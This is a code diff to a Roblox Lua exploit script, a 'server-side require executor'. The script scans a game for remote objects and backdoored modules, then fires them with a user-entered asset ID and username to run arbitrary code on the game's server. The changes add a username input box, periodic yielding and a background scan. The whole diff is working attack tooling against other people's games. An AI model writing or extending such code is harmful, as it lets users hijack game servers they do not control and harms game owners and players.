@@ -20,7 +20,11 @@ local function scanForBackdoors()
     local methods = {"RemoteEvent", "RemoteFunction", "LoadString", "require", "ModuleScript", "Script"}
 
     for _, obj in pairs(game:GetDescendants()) do
-        coroutine.yield()
+        -- Yield periodically to avoid freezing
+        if #backdoors % 100 == 0 then
+            wait()
+        end
+
         for _, method in pairs(methods) do
             if obj:IsA(method) or (obj:IsA("ModuleScript") and obj.Source:find("require")) then
                 table.insert(backdoors, obj)
@@ -34,7 +38,7 @@ local function scanForBackdoors()
 end
 
 -- Server-Side Require Execution via Backdoor
-local function executeServerRequire(scriptID)
+local function executeServerRequire(scriptID, username)
     showNotification("Warning", "You might encounter some bugs or crashes. Also, it might freeze.", 5)
     local backdoors = scanForBackdoors()
     for _, backdoor in ipairs(backdoors) do
@@ -44,9 +48,9 @@ local function executeServerRequire(scriptID)
                 error("[ERROR] Backdoor object not found: " .. backdoor:GetFullName())
             end
             if obj:IsA("RemoteFunction") then
-                return obj:InvokeServer(scriptID)
+                return obj:InvokeServer(scriptID, username)
             elseif obj:IsA("RemoteEvent") then
-                obj:FireServer(scriptID)
+                obj:FireServer(scriptID, username)
                 return "[SUCCESS] Fired RemoteEvent"
             else
                 error("[ERROR] No suitable RemoteFunction or RemoteEvent found for backdoor: " .. backdoor:GetFullName())
@@ -104,6 +108,7 @@ local function createUI()
     local WarningLabel = Instance.new("TextLabel")
     local UIGradient = Instance.new("UIGradient")
     local InputBox = Instance.new("TextBox")
+    local UsernameBox = Instance.new("TextBox")
     local ExecuteButton = Instance.new("TextButton")
     
     ScreenGui.Parent = game.CoreGui
@@ -153,10 +158,19 @@ local function createUI()
     InputBox.TextScaled = true
     InputBox.Font = Enum.Font.SourceSans
 
+    UsernameBox.Parent = Frame
+    UsernameBox.Size = UDim2.new(0.8, 0, 0.1, 0)
+    UsernameBox.Position = UDim2.new(0.1, 0, 0.5, 0)
+    UsernameBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    UsernameBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+    UsernameBox.PlaceholderText = "Enter username here"
+    UsernameBox.TextScaled = true
+    UsernameBox.Font = Enum.Font.SourceSans
+
     ExecuteButton.Parent = Frame
     ExecuteButton.Text = "EXECUTE"
     ExecuteButton.Size = UDim2.new(0.3, 0, 0.15, 0)
-    ExecuteButton.Position = UDim2.new(0.35, 0, 0.5, 0)
+    ExecuteButton.Position = UDim2.new(0.35, 0, 0.65, 0)
     ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255) -- Lighter color for better contrast
     ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
     ExecuteButton.TextScaled = true
@@ -178,7 +192,8 @@ local function createUI()
     ExecuteButton.MouseButton1Click:Connect(function()
         showNotification("Warning", "You might encounter some bugs or crashes. Also, it might freeze.", 5)
         local userInput = InputBox.Text
-        local success, result = pcall(executeServerRequire, userInput)
+        local username = UsernameBox.Text
+        local success, result = pcall(executeServerRequire, userInput, username)
         if success then
             print("[SUCCESS] Script executed: " .. result)
         else
@@ -194,8 +209,10 @@ local function createUI()
     }
 
     -- Perform initial scan
-    local backdoors = scanForBackdoors()
-    print("Initial scan completed. Found backdoors: " .. #backdoors)
+    spawn(function()
+        local backdoors = scanForBackdoors()
+        print("Initial scan completed. Found backdoors: " .. #backdoors)
+    end)
 end
 
 -- Start UI creation
